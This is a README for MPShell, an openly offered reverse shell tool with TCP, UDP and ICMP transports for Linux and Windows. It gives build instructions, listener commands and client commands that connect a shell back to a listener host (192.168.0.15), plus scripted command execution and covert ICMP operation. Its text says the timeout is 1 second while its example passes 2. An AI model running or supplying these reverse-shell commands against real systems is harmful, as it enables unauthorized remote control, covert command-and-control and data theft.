# MPShell
Multi-protocol (TCP, UDP, ICMP) multi-OS reverse shell

- supports TCP, UDP & ICMP protocols
- works on Linux & Windows
- supports command input from a file and result output to a file

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/MPShell/Images/tcp_server.png)

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/MPShell/Images/icmp_server_files.png)

---

**Building**
```angular2html
git clone https://github.com/FilipBlazekovic/mpshell.git
cd mpshell

# Building linux reverse shell listener
cd MPListener
make

# Building linux reverse shell client
cd MPShell-linux
make

# Building windows reverse shell client (needs to be built on windows)
cd MPShell-windows
make

```

---

**Starting a TCP listener**

```
./MPListener --protocol=tcp --port=8080
```

To start a TCP listener that accepts a list of commands that will be executed when the client connects from a file (one command per line) and writes the result to a file, `--command-file` & `--result-file` options are used. After all the commands have been executed, input falls back to stdin. Output can then also be redirected to stdout by using `$close-output` command.

```
./MPListener --protocol=tcp --port=8080 --command-file=/path/commands.txt --result-file=/path/result.txt
```

---

**Starting a UDP listener**

```
./MPListener --protocol=udp --port=8080
./MPListener --protocol=udp --port=8080 --command-file=/path/commands.txt --result-file=/path/result.txt
```

---

**Starting a ICMP listener**

To start a ICMP listener, root is required, given that raw sockets are used, and automatic ICMP kernel replies need to be disabled. Root is only required on the server side for ICMP protocol. On the client side non-raw ICMP sockets are used `socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)` if the user is allowed to use them based on the contents of `/proc/sys/net/ipv4/ping_group_range` file.

```
./MPListener --protocol=icmp
./MPListener --protocol=icmp --command-file=/path/commands.txt --result-file=/path/result.txt
```

---

**Starting a reverse shell**

```
./MPShell --protocol=tcp --host=192.168.0.15 --port=8080
./MPShell --protocol=udp --host=192.168.0.15 --port=8080
./MPShell --protocol=icmp --host=192.168.0.15
```

---

**Setting additional options for a reverse shell**

The following line sets the read timeout to 1 second, sleep between packets (when there is no payload to send) to 500 ms, and the payload size to 1000 bytes.

```./MPShell --protocol=udp --host=192.168.0.15 --port=8080 --timeout=2 --sleep=500 --payload-size=1000```
